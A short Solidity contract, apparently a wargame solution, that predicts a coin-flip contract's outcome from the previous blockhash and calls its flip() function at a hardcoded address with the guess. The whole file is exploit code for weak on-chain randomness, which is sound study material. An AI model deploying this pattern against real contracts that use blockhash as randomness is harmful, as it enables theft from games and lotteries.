pragma solidity ^0.4.18;

contract CoinFlip {
    function flip(bool _guess) public returns (bool) {}
}
contract AliciaGuess {
    address owner;
    uint256 lastHash;
    uint256 public consecutiveWins;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip target = CoinFlip(0x5e47188c3fa229657a9498f18f64eb2f0dc13777);
    
    function AliciaGuess() {
        owner = msg.sender;
    }
    
  function flip() public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    //compare last hash
    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool side = coinFlip == 1 ? true : false;
    
    consecutiveWins++;
    target.flip(side);
    return true;
  }
}